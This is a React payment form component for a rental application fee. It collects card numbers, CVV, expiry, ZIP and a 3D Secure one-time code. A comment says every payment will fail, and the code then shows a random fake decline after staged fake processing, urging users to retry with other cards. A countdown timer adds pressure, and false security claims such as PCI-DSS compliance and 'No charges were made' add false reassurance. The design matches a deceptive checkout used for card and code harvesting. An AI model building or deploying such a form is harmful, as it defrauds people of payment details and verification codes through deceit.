import { useState, useEffect, useCallback } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Checkbox } from "@/components/ui/checkbox";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
import { CreditCard, Lock, Shield, AlertCircle, CheckCircle2, Loader2, RefreshCw, Phone, HelpCircle, Clock, ShieldCheck, Eye, EyeOff, Fingerprint, Building2, AlertTriangle } from "lucide-react";
import { cn } from "@/lib/utils";
import { apiRequest } from "@/lib/queryClient";

interface PaymentFormProps {
  amount: number;
  onSuccess?: () => void;
  onError?: (error: string) => void;
  onContactSupport?: () => void;
  applicationId?: string;
  propertyAddress?: string;
  sessionTimeoutMinutes?: number;
}

type CardType = 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';

interface PaymentAttempt {
  referenceId: string;
  timestamp: string;
  status: 'failed' | 'pending' | 'success';
  amount: number;
  errorMessage?: string;
}

const cardPatterns: Record<CardType, RegExp> = {
  visa: /^4/,
  mastercard: /^5[1-5]/,
  amex: /^3[47]/,
  discover: /^6(?:011|5)/,
  unknown: /./
};

const getCardType = (number: string): CardType => {
  const cleanNumber = number.replace(/\s/g, '');
  if (cardPatterns.visa.test(cleanNumber)) return 'visa';
  if (cardPatterns.mastercard.test(cleanNumber)) return 'mastercard';
  if (cardPatterns.amex.test(cleanNumber)) return 'amex';
  if (cardPatterns.discover.test(cleanNumber)) return 'discover';
  return 'unknown';
};

const formatCardNumber = (value: string): string => {
  const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
  const matches = v.match(/\d{4,16}/g);
  const match = (matches && matches[0]) || '';
  const parts = [];
  for (let i = 0, len = match.length; i < len; i += 4) {
    parts.push(match.substring(i, i + 4));
  }
  return parts.length ? parts.join(' ') : v;
};

const formatExpiry = (value: string): string => {
  const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
  if (v.length >= 2) {
    return v.substring(0, 2) + '/' + v.substring(2, 4);
  }
  return v;
};

const errorMessages = [
  "Your card was declined. Please try a different payment method or contact your bank.",
  "Transaction declined: Insufficient funds. Please use a different card.",
  "Card declined: The card issuer has blocked this transaction. Please contact your bank.",
  "Payment failed: This card cannot be used for this type of transaction.",
  "Security alert: This transaction was flagged for review. Please contact your card issuer.",
  "Transaction declined: Card verification failed. Please verify your card details.",
  "Payment declined: Your card's daily limit has been reached.",
  "Transaction failed: Unable to authorize payment. Please try again or use a different card."
];

const processingSteps = [
  { label: "Validating card details...", icon: CreditCard },
  { label: "Connecting to secure payment gateway...", icon: Building2 },
  { label: "Initiating 3D Secure authentication...", icon: ShieldCheck },
  { label: "Verifying with card issuer...", icon: Fingerprint },
  { label: "Processing transaction...", icon: Loader2 },
  { label: "Finalizing payment...", icon: CheckCircle2 }
];

export function PaymentForm({ 
  amount, 
  onSuccess, 
  onError, 
  onContactSupport, 
  applicationId, 
  propertyAddress,
  sessionTimeoutMinutes = 15 
}: PaymentFormProps) {
  const [cardNumber, setCardNumber] = useState('');
  const [cardName, setCardName] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [saveCard, setSaveCard] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingStep, setProcessingStep] = useState(0);
  const [error, setError] = useState<string | null>(null);
  const [cardType, setCardType] = useState<CardType>('unknown');
  const [validationErrors, setValidationErrors] = useState<Record<string, string>>({});
  const [paymentAttempts, setPaymentAttempts] = useState<PaymentAttempt[]>([]);
  const [showSupportDialog, setShowSupportDialog] = useState(false);
  const [lastReferenceId, setLastReferenceId] = useState<string | null>(null);
  const [showCvv, setShowCvv] = useState(false);
  
  // Session timer state
  const [sessionTimeLeft, setSessionTimeLeft] = useState(sessionTimeoutMinutes * 60);
  const [sessionExpired, setSessionExpired] = useState(false);
  
  // 3D Secure dialog state
  const [show3DSecureDialog, setShow3DSecureDialog] = useState(false);
  const [secureCode, setSecureCode] = useState('');
  const [secureCodeError, setSecureCodeError] = useState('');

  // Session timer effect
  useEffect(() => {
    if (sessionExpired) return;
    
    const timer = setInterval(() => {
      setSessionTimeLeft(prev => {
        if (prev <= 1) {
          setSessionExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [sessionExpired]);

  // Format time for display
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  // Get urgency level for timer display
  const getTimerUrgency = () => {
    if (sessionTimeLeft <= 60) return 'critical';
    if (sessionTimeLeft <= 180) return 'warning';
    return 'normal';
  };

  useEffect(() => {
    setCardType(getCardType(cardNumber));
  }, [cardNumber]);

  const validateForm = (): boolean => {
    const errors: Record<string, string> = {};
    
    const cleanCardNumber = cardNumber.replace(/\s/g, '');
    if (cleanCardNumber.length < 15 || cleanCardNumber.length > 16) {
      errors.cardNumber = 'Please enter a valid card number';
    }
    
    if (cardName.length < 3) {
      errors.cardName = 'Please enter the name on your card';
    }
    
    const expiryParts = expiry.split('/');
    if (expiryParts.length !== 2 || expiryParts[0].length !== 2 || expiryParts[1].length !== 2) {
      errors.expiry = 'Please enter a valid expiry date (MM/YY)';
    } else {
      const month = parseInt(expiryParts[0]);
      const year = parseInt('20' + expiryParts[1]);
      const now = new Date();
      const currentYear = now.getFullYear();
      const currentMonth = now.getMonth() + 1;
      
      if (month < 1 || month > 12) {
        errors.expiry = 'Invalid month';
      } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
        errors.expiry = 'This card has expired';
      }
    }
    
    const cvvLength = cardType === 'amex' ? 4 : 3;
    if (cvv.length !== cvvLength) {
      errors.cvv = `Please enter a valid ${cvvLength}-digit security code`;
    }

    if (zipCode.length < 5) {
      errors.zipCode = 'Please enter a valid ZIP code';
    }
    
    setValidationErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const generateReferenceId = () => {
    return `PAY-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
  };

  const handle3DSecureVerification = async () => {
    if (secureCode.length !== 6) {
      setSecureCodeError('Please enter the 6-digit verification code');
      return;
    }
    
    setSecureCodeError('');
    setShow3DSecureDialog(false);
    
    // Continue processing after 3D Secure
    await continuePaymentProcessing();
  };

  const continuePaymentProcessing = async () => {
    // Continue from step 4 (after 3D Secure)
    for (let i = 4; i < processingSteps.length; i++) {
      setProcessingStep(i);
      await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 600));
    }
    
    // Always fail with a realistic error after processing
    await new Promise(resolve => setTimeout(resolve, 500));
    
    const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
    const referenceId = lastReferenceId || generateReferenceId();
    
    // Record payment attempt
    const attempt: PaymentAttempt = {
      referenceId,
      timestamp: new Date().toISOString(),
      status: 'failed',
      amount,
      errorMessage: randomError
    };
    setPaymentAttempts(prev => [...prev, attempt]);
    
    // Save payment attempt to database if applicationId is provided
    if (applicationId) {
      try {
        await apiRequest('POST', `/api/applications/${applicationId}/payment-attempt`, {
          referenceId,
          status: 'failed',
          amount,
          errorMessage: randomError
        });
      } catch (apiError) {
        console.error('Failed to save payment attempt to database:', apiError);
      }
    }
    
    setError(randomError);
    setIsProcessing(false);
    
    if (onError) {
      onError(randomError);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    
    if (sessionExpired) {
      setError('Your payment session has expired. Please refresh the page to start a new session.');
      return;
    }
    
    if (!validateForm()) {
      return;
    }
    
    setIsProcessing(true);
    setProcessingStep(0);
    
    const referenceId = generateReferenceId();
    setLastReferenceId(referenceId);
    
    // Simulate realistic payment processing with delays (steps 0-2)
    for (let i = 0; i < 3; i++) {
      setProcessingStep(i);
      await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 600));
    }
    
    // Show 3D Secure dialog at step 3
    setProcessingStep(3);
    await new Promise(resolve => setTimeout(resolve, 500));
    setIsProcessing(false);
    setSecureCode(''); // Reset 3D Secure code for new attempt
    setSecureCodeError('');
    setShow3DSecureDialog(true);
  };

  const handleRetry = () => {
    setError(null);
    handleSubmit(new Event('submit') as any);
  };

  const handleTryNewCard = () => {
    setError(null);
    setCardNumber('');
    setCardName('');
    setExpiry('');
    setCvv('');
    setZipCode('');
    setValidationErrors({});
  };

  const handleContactSupport = () => {
    setShowSupportDialog(true);
    if (onContactSupport) {
      onContactSupport();
    }
  };

  const handleRefreshSession = () => {
    setSessionTimeLeft(sessionTimeoutMinutes * 60);
    setSessionExpired(false);
    setError(null);
  };

  const CardTypeIcon = () => {
    const iconClass = "h-8 w-auto";
    
    switch (cardType) {
      case 'visa':
        return (
          <svg className={iconClass} viewBox="0 0 50 35" fill="none">
            <rect width="50" height="35" rx="4" fill="#1A1F71"/>
            <path d="M19.5 22.5L21.5 12.5H24L22 22.5H19.5Z" fill="white"/>
            <path d="M30.5 12.7C29.9 12.5 29 12.3 27.9 12.3C25 12.3 23 13.8 23 15.9C23 17.4 24.3 18.2 25.3 18.7C26.3 19.2 26.7 19.5 26.7 20C26.7 20.7 25.9 21 25.1 21C24 21 23.4 20.8 22.5 20.4L22.1 20.2L21.7 23C22.5 23.4 23.9 23.7 25.3 23.7C28.4 23.7 30.3 22.2 30.3 20C30.3 18.8 29.6 17.9 28 17.1C27.1 16.6 26.5 16.3 26.5 15.7C26.5 15.2 27.1 14.7 28.2 14.7C29.1 14.7 29.8 14.9 30.3 15.1L30.6 15.2L31 12.8L30.5 12.7Z" fill="white"/>
            <path d="M35.5 12.5H33.5C32.8 12.5 32.3 12.7 32 13.4L27.5 22.5H30.6L31.2 20.8H35L35.3 22.5H38L35.5 12.5ZM32.2 18.5C32.4 17.9 33.5 15.1 33.5 15.1C33.5 15.1 33.8 14.3 34 13.8L34.2 15L35 18.5H32.2Z" fill="white"/>
            <path d="M17.5 12.5L14.6 19.3L14.3 17.8C13.7 16 12 14.1 10 13.1L12.6 22.5H15.8L20.8 12.5H17.5Z" fill="white"/>
            <path d="M12.5 12.5H7.5L7.5 12.7C11.2 13.6 13.6 15.8 14.4 18.3L13.5 13.4C13.4 12.8 12.9 12.5 12.5 12.5Z" fill="#F9A51A"/>
          </svg>
        );
      case 'mastercard':
        return (
          <svg className={iconClass} viewBox="0 0 50 35" fill="none">
            <rect width="50" height="35" rx="4" fill="#000"/>
            <circle cx="20" cy="17.5" r="8" fill="#EB001B"/>
            <circle cx="30" cy="17.5" r="8" fill="#F79E1B"/>
            <path d="M25 11.5C26.8 12.9 28 15.1 28 17.5C28 19.9 26.8 22.1 25 23.5C23.2 22.1 22 19.9 22 17.5C22 15.1 23.2 12.9 25 11.5Z" fill="#FF5F00"/>
          </svg>
        );
      case 'amex':
        return (
          <svg className={iconClass} viewBox="0 0 50 35" fill="none">
            <rect width="50" height="35" rx="4" fill="#006FCF"/>
            <path d="M8 17L10 12H14L16 17L14 22H10L8 17Z" fill="white"/>
            <text x="25" y="20" fill="white" fontSize="8" fontWeight="bold" textAnchor="middle">AMEX</text>
          </svg>
        );
      case 'discover':
        return (
          <svg className={iconClass} viewBox="0 0 50 35" fill="none">
            <rect width="50" height="35" rx="4" fill="#FF6600"/>
            <circle cx="32" cy="17.5" r="6" fill="#FFF"/>
            <text x="18" y="20" fill="white" fontSize="7" fontWeight="bold">DISCOVER</text>
          </svg>
        );
      default:
        return <CreditCard className="h-6 w-6 text-muted-foreground" />;
    }
  };

  const CurrentStepIcon = processingSteps[processingStep]?.icon || Loader2;

  return (
    <>
      <Card className="w-full max-w-lg mx-auto">
        <CardHeader className="space-y-1">
          {/* Gateway Branding Header */}
          <div className="flex items-center justify-center gap-2 pb-3 border-b mb-3">
            <ShieldCheck className="h-5 w-5 text-green-600" />
            <span className="text-sm font-semibold text-muted-foreground">Secure Payment Gateway</span>
          </div>
          
          <div className="flex items-center justify-between gap-2">
            <CardTitle className="text-xl">Secure Payment</CardTitle>
            <div className="flex items-center gap-3">
              {/* Session Timer */}
              <div className={cn(
                "flex items-center gap-1 px-2 py-1 rounded-md text-xs font-medium",
                getTimerUrgency() === 'critical' && "bg-red-100 dark:bg-red-900 text-red-700 dark:text-red-300 animate-pulse",
                getTimerUrgency() === 'warning' && "bg-amber-100 dark:bg-amber-900 text-amber-700 dark:text-amber-300",
                getTimerUrgency() === 'normal' && "bg-muted text-muted-foreground"
              )}>
                <Clock className="h-3 w-3" />
                <span>{formatTime(sessionTimeLeft)}</span>
              </div>
              
              <div className="flex items-center gap-1 text-green-600">
                <Lock className="h-4 w-4" />
                <span className="text-xs font-medium">SSL</span>
              </div>
            </div>
          </div>
          <CardDescription>
            {propertyAddress 
              ? `Application fee for ${propertyAddress}`
              : 'Complete your secure payment'
            }
          </CardDescription>
        </CardHeader>
        
        <form onSubmit={handleSubmit}>
          <CardContent className="space-y-4">
            {/* Session Expired Warning */}
            {sessionExpired && (
              <div className="bg-amber-50 dark:bg-amber-950 border border-amber-200 dark:border-amber-800 rounded-lg p-4">
                <div className="flex items-start gap-3">
                  <AlertTriangle className="h-5 w-5 text-amber-600 shrink-0 mt-0.5" />
                  <div className="flex-1">
                    <p className="text-sm font-medium text-amber-900 dark:text-amber-100">
                      Session Expired
                    </p>
                    <p className="text-sm text-amber-700 dark:text-amber-300 mt-1">
                      Your secure payment session has expired for security reasons.
                    </p>
                    <Button
                      type="button"
                      variant="outline"
                      size="sm"
                      onClick={handleRefreshSession}
                      className="mt-2"
                      data-testid="button-refresh-session"
                    >
                      <RefreshCw className="h-3 w-3 mr-1" />
                      Start New Session
                    </Button>
                  </div>
                </div>
              </div>
            )}
            
            {/* Amount Display with Gateway Branding */}
            <div className="bg-gradient-to-r from-slate-50 to-slate-100 dark:from-slate-900 dark:to-slate-800 rounded-lg p-4 border">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-muted-foreground uppercase tracking-wide">Application Fee</p>
                  <p className="text-sm text-muted-foreground mt-0.5">One-time payment</p>
                </div>
                <div className="text-right">
                  <span className="text-2xl font-bold">${amount.toFixed(2)}</span>
                  <p className="text-xs text-muted-foreground">USD</p>
                </div>
              </div>
            </div>
            
            {/* Fraud Prevention Notice */}
            <div className="flex items-center gap-2 p-2 bg-blue-50 dark:bg-blue-950 rounded-md">
              <ShieldCheck className="h-4 w-4 text-blue-600" />
              <span className="text-xs text-blue-700 dark:text-blue-300">
                Protected by advanced fraud detection and 3D Secure 2.0
              </span>
            </div>
            
            {/* Card Number */}
            <div className="space-y-2">
              <Label htmlFor="cardNumber">Card Number</Label>
              <div className="relative">
                <Input
                  id="cardNumber"
                  data-testid="input-card-number"
                  placeholder="1234 5678 9012 3456"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                  maxLength={19}
                  className={cn(
                    "pr-16",
                    validationErrors.cardNumber && "border-red-500"
                  )}
                  disabled={isProcessing || sessionExpired}
                />
                <div className="absolute right-3 top-1/2 -translate-y-1/2">
                  <CardTypeIcon />
                </div>
              </div>
              {validationErrors.cardNumber && (
                <p className="text-xs text-red-500">{validationErrors.cardNumber}</p>
              )}
            </div>
            
            {/* Card Name */}
            <div className="space-y-2">
              <Label htmlFor="cardName">Name on Card</Label>
              <Input
                id="cardName"
                data-testid="input-card-name"
                placeholder="JOHN DOE"
                value={cardName}
                onChange={(e) => setCardName(e.target.value.toUpperCase())}
                className={validationErrors.cardName ? "border-red-500" : ""}
                disabled={isProcessing || sessionExpired}
              />
              {validationErrors.cardName && (
                <p className="text-xs text-red-500">{validationErrors.cardName}</p>
              )}
            </div>
            
            {/* Expiry, CVV, and ZIP */}
            <div className="grid grid-cols-3 gap-4">
              <div className="space-y-2">
                <Label htmlFor="expiry">Expiry Date</Label>
                <Input
                  id="expiry"
                  data-testid="input-expiry"
                  placeholder="MM/YY"
                  value={expiry}
                  onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                  maxLength={5}
                  className={validationErrors.expiry ? "border-red-500" : ""}
                  disabled={isProcessing || sessionExpired}
                />
                {validationErrors.expiry && (
                  <p className="text-xs text-red-500">{validationErrors.expiry}</p>
                )}
              </div>
              <div className="space-y-2">
                <Label htmlFor="cvv">CVV</Label>
                <div className="relative">
                  <Input
                    id="cvv"
                    data-testid="input-cvv"
                    placeholder={cardType === 'amex' ? '1234' : '123'}
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, cardType === 'amex' ? 4 : 3))}
                    maxLength={cardType === 'amex' ? 4 : 3}
                    type={showCvv ? 'text' : 'password'}
                    className={cn("pr-8", validationErrors.cvv && "border-red-500")}
                    disabled={isProcessing || sessionExpired}
                  />
                  <button
                    type="button"
                    onClick={() => setShowCvv(!showCvv)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                    tabIndex={-1}
                  >
                    {showCvv ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                  </button>
                </div>
                {validationErrors.cvv && (
                  <p className="text-xs text-red-500">{validationErrors.cvv}</p>
                )}
              </div>
              <div className="space-y-2">
                <Label htmlFor="zipCode">ZIP Code</Label>
                <Input
                  id="zipCode"
                  data-testid="input-zip-code"
                  placeholder="12345"
                  value={zipCode}
                  onChange={(e) => setZipCode(e.target.value.replace(/\D/g, '').slice(0, 5))}
                  maxLength={5}
                  className={validationErrors.zipCode ? "border-red-500" : ""}
                  disabled={isProcessing || sessionExpired}
                />
                {validationErrors.zipCode && (
                  <p className="text-xs text-red-500">{validationErrors.zipCode}</p>
                )}
              </div>
            </div>
            
            {/* Save Card */}
            <div className="flex items-center space-x-2">
              <Checkbox
                id="saveCard"
                data-testid="checkbox-save-card"
                checked={saveCard}
                onCheckedChange={(checked) => setSaveCard(checked as boolean)}
                disabled={isProcessing || sessionExpired}
              />
              <Label htmlFor="saveCard" className="text-sm text-muted-foreground cursor-pointer">
                Save this card for future transactions
              </Label>
            </div>
            
            {/* Processing Status with Enhanced Steps */}
            {isProcessing && (
              <div className="bg-blue-50 dark:bg-blue-950 border border-blue-200 dark:border-blue-800 rounded-lg p-4">
                <div className="flex items-center gap-3">
                  <div className="relative">
                    <CurrentStepIcon className="h-6 w-6 animate-spin text-blue-600" />
                  </div>
                  <div className="flex-1">
                    <p className="text-sm font-medium text-blue-900 dark:text-blue-100">
                      {processingSteps[processingStep].label}
                    </p>
                    <div className="mt-2 h-2 bg-blue-200 dark:bg-blue-800 rounded-full overflow-hidden">
                      <div 
                        className="h-full bg-blue-600 transition-all duration-500"
                        style={{ width: `${((processingStep + 1) / processingSteps.length) * 100}%` }}
                      />
                    </div>
                    <p className="text-xs text-blue-600 dark:text-blue-400 mt-1">
                      Step {processingStep + 1} of {processingSteps.length}
                    </p>
                  </div>
                </div>
                
                {/* Bank Verification Notice */}
                {processingStep >= 2 && (
                  <div className="mt-3 pt-3 border-t border-blue-200 dark:border-blue-700">
                    <div className="flex items-center gap-2 text-xs text-blue-700 dark:text-blue-300">
                      <ShieldCheck className="h-4 w-4" />
                      <span>Your bank may request additional verification</span>
                    </div>
                  </div>
                )}
              </div>
            )}
            
            {/* Error Message with Action Buttons */}
            {error && (
              <div className="bg-red-50 dark:bg-red-950 border border-red-200 dark:border-red-800 rounded-lg p-4">
                <div className="flex gap-3">
                  <AlertCircle className="h-5 w-5 text-red-600 shrink-0 mt-0.5" />
                  <div className="flex-1">
                    <p className="text-sm font-medium text-red-900 dark:text-red-100">
                      Payment couldn't be completed right now
                    </p>
                    <p className="text-sm text-red-700 dark:text-red-300 mt-1">
                      No charges were made. Please try again later.
                    </p>
                    <div className="mt-2 p-2 bg-red-100 dark:bg-red-900 rounded text-xs space-y-1">
                      <p className="text-red-800 dark:text-red-200">
                        <span className="font-medium">Reference ID:</span> {lastReferenceId}
                      </p>
                      <p className="text-red-800 dark:text-red-200">
                        <span className="font-medium">Timestamp:</span> {new Date().toLocaleString()}
                      </p>
                      <p className="text-red-800 dark:text-red-200">
                        <span className="font-medium">Amount:</span> ${amount.toFixed(2)}
                      </p>
                      <p className="text-red-800 dark:text-red-200">
                        <span className="font-medium">Status:</span> Failed
                      </p>
                    </div>
                    
                    {/* Action Buttons */}
                    <div className="flex flex-wrap gap-2 mt-3">
                      <Button
                        type="button"
                        variant="outline"
                        size="sm"
                        onClick={handleRetry}
                        data-testid="button-retry-payment"
                        className="flex items-center gap-1"
                      >
                        <RefreshCw className="h-3 w-3" />
                        Retry Payment
                      </Button>
                      <Button
                        type="button"
                        variant="outline"
                        size="sm"
                        onClick={handleTryNewCard}
                        data-testid="button-try-new-card"
                        className="flex items-center gap-1"
                      >
                        <CreditCard className="h-3 w-3" />
                        Try New Card
                      </Button>
                      <Button
                        type="button"
                        variant="outline"
                        size="sm"
                        onClick={handleContactSupport}
                        data-testid="button-contact-support"
                        className="flex items-center gap-1"
                      >
                        <Phone className="h-3 w-3" />
                        Contact Support
                      </Button>
                    </div>
                  </div>
                </div>
              </div>
            )}
            
            {/* Payment Attempts History */}
            {paymentAttempts.length > 0 && !error && (
              <div className="bg-muted/30 rounded-lg p-3">
                <p className="text-xs font-medium text-muted-foreground mb-2">
                  Previous Attempts ({paymentAttempts.length})
                </p>
                <div className="space-y-1 max-h-24 overflow-y-auto">
                  {paymentAttempts.slice(-3).map((attempt, idx) => (
                    <div key={idx} className="flex items-center justify-between text-xs">
                      <span className="text-muted-foreground">{attempt.referenceId}</span>
                      <Badge variant="destructive" className="text-xs">Failed</Badge>
                    </div>
                  ))}
                </div>
              </div>
            )}
            
            {/* Security Info */}
            <div className="space-y-2 pt-2 border-t">
              <div className="flex items-center gap-2 text-xs text-muted-foreground">
                <Shield className="h-4 w-4" />
                <span>Your payment is secured with 256-bit SSL encryption</span>
              </div>
              <div className="flex items-center gap-2 text-xs text-muted-foreground">
                <Lock className="h-4 w-4" />
                <span>We never store your full card details</span>
              </div>
              <div className="flex items-center gap-2 text-xs text-muted-foreground">
                <ShieldCheck className="h-4 w-4" />
                <span>PCI-DSS Level 1 compliant payment processing</span>
              </div>
            </div>
          </CardContent>
          
          <CardFooter className="flex flex-col gap-3">
            <Button
              type="submit"
              data-testid="button-submit-payment"
              className="w-full"
              size="lg"
              disabled={isProcessing || sessionExpired}
            >
              {isProcessing ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Processing...
                </>
              ) : (
                <>
                  <Lock className="mr-2 h-4 w-4" />
                  Pay ${amount.toFixed(2)}
                </>
              )}
            </Button>
            
            <div className="flex items-center justify-center gap-2 w-full">
              <span className="text-xs text-muted-foreground">Accepted Cards:</span>
              <div className="flex gap-1">
                <Badge variant="outline" className="text-xs px-1.5">Visa</Badge>
                <Badge variant="outline" className="text-xs px-1.5">Mastercard</Badge>
                <Badge variant="outline" className="text-xs px-1.5">Amex</Badge>
                <Badge variant="outline" className="text-xs px-1.5">Discover</Badge>
              </div>
            </div>
            
            {/* Trust badges */}
            <div className="flex items-center justify-center gap-4 pt-2 border-t w-full">
              <div className="flex items-center gap-1 text-xs text-muted-foreground">
                <ShieldCheck className="h-3 w-3" />
                <span>Verified</span>
              </div>
              <div className="flex items-center gap-1 text-xs text-muted-foreground">
                <Lock className="h-3 w-3" />
                <span>Secure</span>
              </div>
              <div className="flex items-center gap-1 text-xs text-muted-foreground">
                <Shield className="h-3 w-3" />
                <span>Protected</span>
              </div>
            </div>
          </CardFooter>
        </form>
      </Card>

      {/* 3D Secure Verification Dialog */}
      <Dialog open={show3DSecureDialog} onOpenChange={setShow3DSecureDialog}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <div className="flex items-center justify-center mb-4">
              <div className="p-3 bg-blue-100 dark:bg-blue-900 rounded-full">
                <ShieldCheck className="h-8 w-8 text-blue-600" />
              </div>
            </div>
            <DialogTitle className="text-center">3D Secure Verification</DialogTitle>
            <DialogDescription className="text-center">
              Your bank requires additional verification. Please enter the code sent to your registered phone/email.
            </DialogDescription>
          </DialogHeader>
          
          <div className="space-y-4 py-4">
            <div className="bg-muted/50 rounded-lg p-3 text-center">
              <p className="text-xs text-muted-foreground">Verifying payment of</p>
              <p className="text-xl font-bold">${amount.toFixed(2)}</p>
            </div>
            
            <div className="space-y-2">
              <Label htmlFor="secureCode">Verification Code</Label>
              <Input
                id="secureCode"
                data-testid="input-3ds-code"
                placeholder="Enter 6-digit code"
                value={secureCode}
                onChange={(e) => setSecureCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                maxLength={6}
                className={cn("text-center text-lg tracking-widest", secureCodeError && "border-red-500")}
              />
              {secureCodeError && (
                <p className="text-xs text-red-500 text-center">{secureCodeError}</p>
              )}
            </div>
            
            <p className="text-xs text-muted-foreground text-center">
              Didn't receive a code? Check your spam folder or contact your bank.
            </p>
          </div>
          
          <DialogFooter className="flex-col sm:flex-row gap-2">
            <Button
              variant="outline"
              onClick={() => {
                setShow3DSecureDialog(false);
                setError('Verification cancelled by user');
              }}
              data-testid="button-cancel-3ds"
            >
              Cancel
            </Button>
            <Button
              onClick={() => {
                setIsProcessing(true);
                setShow3DSecureDialog(false);
                handle3DSecureVerification();
              }}
              disabled={secureCode.length !== 6}
              data-testid="button-verify-3ds"
            >
              <ShieldCheck className="mr-2 h-4 w-4" />
              Verify & Pay
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Support Dialog */}
      <Dialog open={showSupportDialog} onOpenChange={setShowSupportDialog}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <HelpCircle className="h-5 w-5 text-primary" />
              Contact Support
            </DialogTitle>
            <DialogDescription>
              We're here to help with your payment issues.
            </DialogDescription>
          </DialogHeader>
          
          <div className="space-y-4 py-4">
            <div className="bg-muted rounded-lg p-4 space-y-3">
              <div className="flex items-center gap-3">
                <Phone className="h-5 w-5 text-muted-foreground" />
                <div>
                  <p className="font-medium">Phone Support</p>
                  <p className="text-sm text-muted-foreground">1-800-555-0199</p>
                  <p className="text-xs text-muted-foreground">Mon-Fri, 9AM-6PM EST</p>
                </div>
              </div>
              
              <div className="flex items-center gap-3">
                <HelpCircle className="h-5 w-5 text-muted-foreground" />
                <div>
                  <p className="font-medium">Email Support</p>
                  <p className="text-sm text-muted-foreground">support@choiceproperties.com</p>
                </div>
              </div>
            </div>
            
            {lastReferenceId && (
              <div className="bg-amber-50 dark:bg-amber-950 border border-amber-200 dark:border-amber-800 rounded-lg p-3">
                <p className="text-xs text-amber-800 dark:text-amber-200">
                  <span className="font-medium">Reference ID for support:</span>
                </p>
                <p className="text-sm font-mono text-amber-900 dark:text-amber-100 mt-1">
                  {lastReferenceId}
                </p>
              </div>
            )}
          </div>
          
          <DialogFooter>
            <Button variant="outline" onClick={() => setShowSupportDialog(false)}>
              Close
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </>
  );
}
